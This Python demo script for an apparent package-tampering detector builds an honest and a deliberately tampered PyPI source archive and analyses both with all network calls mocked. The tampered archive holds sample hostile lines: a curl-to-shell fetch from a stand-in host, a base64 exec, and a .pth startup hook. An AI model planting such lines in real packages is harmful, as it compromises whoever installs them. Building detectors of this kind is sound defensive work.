"""Offline demo: analyse a deliberately tampered PyPI sdist and an honest one, with all network traffic mocked.

    cd backend && .venv/bin/python -m examples.demo_tampered

Writes examples/sample_pypi_tampered_report.json and prints a short summary of both verdicts.
"""
import asyncio
import json
import socket
import tempfile
from pathlib import Path

import respx

from app.config import settings
from app.services import orchestrator
from tests.conftest import make_tar_gz, mock_github_tag, mock_pypi_provenance_missing, mock_pypi_release

HERE = Path(__file__).parent
SOURCE = {
    "src/demo/__init__.py": b"__version__ = '1.0.0'\n",
    "src/demo/core.py": b"def run():\n    return 42\n",
    "pyproject.toml": b"[project]\nname = 'demo'\nversion = '1.0.0'\n",
}


def sdist(tampered: bool) -> bytes:
    files = dict(SOURCE, **{"PKG-INFO": b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0.0\n"})
    if tampered:
        files["src/demo/core.py"] = b"def run():\n    return 42\nimport os; os.system('curl http://evil.example/p | sh')\n"
        files["src/demo/_vendor.py"] = b"import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
        files["demo_hook.pth"] = b"import os; os.system('id')\n"
    return make_tar_gz(files, root_dir="demo-1.0.0")


async def analyse(label: str, tampered: bool) -> dict:
    name = "demo"
    filename = "demo-1.0.0.tar.gz"
    with respx.mock:
        mock_pypi_release(name, "1.0.0", [(filename, "sdist", sdist(tampered))])
        mock_github_tag("acme", name, "v1.0.0", make_tar_gz(SOURCE, root_dir="demo-" + "b" * 40))
        mock_pypi_provenance_missing(name, "1.0.0", filename)
        report = await orchestrator.analyze_package(name, "1.0.0", ecosystem="pypi")
    print(f"{label:9} verdict={report['risk']['verdict']:9} score={report['risk']['score']:>3} "
          f"confidence={report['risk']['confidence']:6} findings={len(report['findings'])}")
    return report


async def main() -> None:
    settings.DATABASE_PATH = str(Path(tempfile.mkdtemp()) / "demo.db")
    settings.AI_ENABLED = False
    real_getaddrinfo = socket.getaddrinfo
    socket.getaddrinfo = lambda host, *a, **k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", ("93.184.216.34", 443))]
    try:
        await analyse("honest", tampered=False)
        report = await analyse("tampered", tampered=True)
    finally:
        socket.getaddrinfo = real_getaddrinfo
    (HERE / "sample_pypi_tampered_report.json").write_text(json.dumps(report, indent=2))
    for f in report["findings"]:
        print(f"  [{f['severity']:6}] {f['rule_id']}: {f.get('file')}")


if __name__ == "__main__":
    asyncio.run(main())
